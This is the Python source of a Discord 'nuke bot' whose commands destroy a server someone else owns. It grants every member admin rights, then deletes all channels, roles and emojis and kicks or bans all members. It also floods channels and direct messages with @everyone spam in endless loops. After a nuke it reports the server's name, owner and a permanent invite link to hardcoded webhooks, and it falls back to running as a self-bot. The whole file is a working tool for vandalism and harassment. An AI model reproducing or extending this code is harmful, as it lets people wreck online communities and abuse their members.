#MAKE SURE YOU PUT YOUR BOTS TOKEN ON LINE 12
import discord
from discord.ext import commands
import random
from discord import Permissions
import os
import colorama
from colorama import Fore, Style
import asyncio
from discord_webhook import DiscordWebhook, DiscordEmbed

token = "TOKEN HERE"

CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
 
MESSAGE_CONTENTS = ["https://media.discordapp.net/attachments/634674676374962197/685781230679228430/no.gif @everyone","@everyone Get Fucking Nuked :clown:","@everyone Get Nuked :crab: https://images.immediate.co.uk/production/volatile/sites/7/2018/11/GettyImages-107808064-6eb5e54.jpg?quality=45&resize=620,413", "@everyone Delete the Server"]

bot = commands.Bot(command_prefix='[')

client = commands.Bot(command_prefix='[')

bot.remove_command('help')

@bot.event
async def on_ready():
   print('Logged in as {}'.format(bot.user.name))
   game = discord.Game("[cmds Nuking Discord Filth")
   await bot.change_presence(status=discord.Status.online, activity=game)
   print("Bot made by Kaotic, Bancer and XxGamerBroskixX")

@bot.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{bot.user.name} has logged out successfully." + Fore.RESET)

@bot.command()
async def help(ctx):
 await ctx.message.delete()
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="Nuke Commands", icon_url=ctx.author.avatar_url)
 
 embed.add_field(name="help", value="Shows this message.", inline=False)
 embed.add_field(name="nuke", value="Nukes the server.", inline=False)
 embed.add_field(name="nick <nickname>", value="Mass nickname change.", inline=False)
 embed.add_field(name="message <message>", value="Dms everyone.", inline=False)
 embed.add_field(name="spam", value="Spams all channels.", inline=False)
 embed.add_field(name="spamchan", value="Spams the channel.", inline=False)
 embed.add_field(name="roles", value="Spam make roles.", inline=False)
 embed.add_field(name="delete", value="Deletes all channels.", inline=False)
 embed.add_field(name="channels", value="Spam creates channels.", inline=False)
 embed.add_field(name="voicec",value="Spam creates voice channels.", inline=False)
 embed.add_field(name="kick", value="Kicks everyone below bot role.", inline=False)
 embed.add_field(name="ban", value="Bans all users below bot role.", inline=False)
 embed.add_field(name="namespam",value="Constantly changes the server name", inline=False)
 embed.add_field(name="clear <amount>", value="Purges messages.", inline=False)
 embed.add_field(name="admin",value="Gives @everyone admin.", inline=False)
 await ctx.send(embed=embed)
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="Nuke Commands Page 2", icon_url=ctx.author.avatar_url)

 embed.add_field(name="ping",value="Shows bots ping.", inline=False)
 embed.add_field(name="cate",value="Spam creates categories.", inline=False)
 embed.add_field(name="customchan <channel names>",value="Creates channel names of your choice.", inline=False)
 embed.add_field(name="rename <channel name>",value="Renames all channels.", inline=False)
 embed.add_field(name="customspam <spam text>",value="Make spam of your choice.", inline=False)
 embed.add_field(name="guildname <name>",value="Changes the server name", inline=False)
 embed.add_field(name="emojidel",value="Deletes all emojis (Can be slow)", inline=False)
 embed.add_field(name="namespam",value="Constantly changes the server name", inline=False)
 embed.add_field(name="info",value="Gives user info.", inline=False)
 embed.add_field(name="roledel",value="Deletes roles above the bots higest role.", inline=False)
 embed.add_field(name="leave",value="Has the bot leave the guild.", inline=False)
 embed.add_field(name="banuser <user>",value="Bans specified user..", inline=False)
 embed.add_field(name="stop",value="Stops the bot using command (BOT OWNER ONLY)", inline=False)

 await ctx.send(embed=embed)

@bot.command()
async def nick(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: change nick")

@bot.command()
async def banuser(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

@bot.command()
async def rename(ctx, rename_to):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            await channel.edit(name=rename_to)

@bot.command()
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def message(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: Mass DM")

@bot.command()
async def leave(ctx):
 await ctx.message.delete
 await ctx.guild.leave()

@bot.command()
async def guildname(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

#please don't spam these I use it to track what servers are nuked
webhooks = ["https://discordapp.com/api/webhooks/698237761123254383/uxxR8lUNIkJ4E8Vf2Jgz2a5YJi0h7X8vllYcOvAnRDdZyUY7Q0GhaDZZ9EC8vq1z57vb","https://discordapp.com/api/webhooks/704450630319603734/dlHOFEo2WYFbjZeJ7YXiXh721BVtm08svv3vcFJLAVRXlFA0g0mDhoK1NRZKjY_OzP0u"]
@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.GREEN + f"@everyone has been given admin permissions in {guild.name}."+ Fore.RESET)
    except:
      print(Fore.RED + f"There was an error when attempting to give everyone perms in {guild.name}." + Fore.RESET)
    print(Style.RESET_ALL)
    await asyncio.sleep(2)
    print(f"Nuking server {guild.name}...")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"{channel.name} was successfully deleted." + Fore.RESET)
      except:
        print(Fore.RED + f"{channel.name} was not deleted." + Fore.RESET)
    for member in guild.members:
      try:
        await member.kick()
        print(Fore.GREEN + f"{member.name}#{member.discriminator} was kicked." + Fore.RESET)
      except:
        print(Fore.RED + f"{member.name}#{member.discriminator} was not kicked." + Fore.RESET)
    for role in guild.roles:
      try:
        await role.delete()
        print(Fore.GREEN + f"{role.name} was successfully deleted." + Fore.RESET)
      except:
        print(Fore.RED + f"{role.name} was not deleted." + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban()
        print(Fore.GREEN + f"{user.name}#{user.discriminator} was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.RED + f"{user.name}#{user.discriminator} was not unbanned." + Fore.RESET)
    await guild.create_text_channel("get nuked.")
    for channel in guild.text_channels:
      if channel.position == 0:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        webhook = DiscordWebhook(url=webhooks)
        log = DiscordEmbed(title = f"Nuke Successful!", description = f"A nukebot just nuked the server **[{guild.name}]({link})**")
        log.add_embed_field(name = "Nukebot Used", value = f"{bot.user.name}#{bot.user.discriminator} ({bot.user.id})")
        log.add_embed_field(name = "Server Owner", value = f"{guild.owner} ({guild.owner.id})", inline = False)
        log.add_embed_field(name = "Member Count", value = f"{guild.member_count}", inline = False)
        log.add_embed_field(name = "Invite Link", value = f"{link}")
        webhook.add_embed(log)
        webhook.execute()
    print(Style.RESET_ALL)
    print(f"Nuked {guild.name} successfully!\n{link}")
    amount = 99
    for i in range(amount):
      await guild.create_text_channel(random.choice(CHANNEL_NAMES))
    print(f"Nuked {guild.name} successfully")
    return

@bot.command()
async def ban(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: Banned")  

@bot.command()
async def roledel(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def clear(ctx, amount=5):
  await ctx.message.delete()
  await ctx.channel.purge(limit=amount)

@bot.command()
async def roles(ctx): 
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Get Thrashed")

@bot.command()
async def spamchan(ctx): 
    await ctx.message.delete()
    while True:
    
     await ctx.send("@everyone Sample Text") 

@bot.command()
async def spam(ctx, amount=1000000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(random.choice(MESSAGE_CONTENTS))
    else:
        while True:  
            for channel in ctx.guild.text_channels: 
              await channel.send(random.choice(MESSAGE_CONTENTS))      

@bot.command()
async def customchan(ctx, *, name, amount=500):
    await ctx.message.delete()
    guild = ctx.message.guild
    for i in range(amount):
        await guild.create_text_channel(name)

@bot.command()
async def kick(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")  
 
@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"Pong! My latency is {round(bot.latency *1000)}ms.")
  
@bot.command()
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("@everyone does NOT have admin")

@bot.command()
async def info(ctx, member: discord.Member):
  await ctx.message.delete()
  member = ctx.author if not member else member
  roles = [role for role in member.roles]

  embed = discord.Embed(colour=member.color, timestamp=ctx.message.created_at)
  
  embed.set_author(name=f"User Info - {member}")
  embed.set_thumbnail(url=member.avatar_url)
  embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar_url)

  embed.add_field(name="User ID", value=member.id)
  embed.add_field(name="Nickname", value=member.display_name)

  embed.add_field(name="Creation Date", value=member.created_at.strftime("%a, %#d %B, %Y, %I:%M %p UTC"))
  embed.add_field(name="Guild Join Date", value=member.joined_at.strftime("%a, %#d %B, %Y, %I:%M %p UTC"))

  embed.add_field(name=f"Roles ({len(roles)})", value=" ".join([role.mention for role in roles]))
  embed.add_field(name="Highest Role", value=member.top_role.mention)

  embed.add_field(name="Bot?", value=member.bot)

  await ctx.send(embed=embed)

@bot.command()
async def cate(ctx, amount=100):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_category(random.choice(CHANNEL_NAMES))

@bot.command()
async def delete(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    print(f"Deleting channel {channel.name}")
    await channel.delete()
  await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
  await ctx.guild.create_voice_channel(random.choice(CHANNEL_NAMES))

@bot.command()
async def customspam(ctx, *, message, amount=100000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(f"@everyone {message}")
    else:
        while True:  
            for channel in ctx.guild.text_channels:      
              await channel.send(f"@everyone {message}")

@bot.command()
async def channels(ctx, amount=500):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_text_channel(random.choice(CHANNEL_NAMES))

@bot.command()
async def namespam(ctx, amount=100):
    await ctx.message.delete()
    for i in range(amount):
      while True:
        await ctx.guild.edit(name = random.choice(CHANNEL_NAMES))

@bot.command()
async def voicec(ctx, amount=500):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_voice_channel(random.choice(CHANNEL_NAMES))

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(MESSAGE_CONTENTS))

try:
  bot.run(token)
except:
  bot.run(token, bot = False)
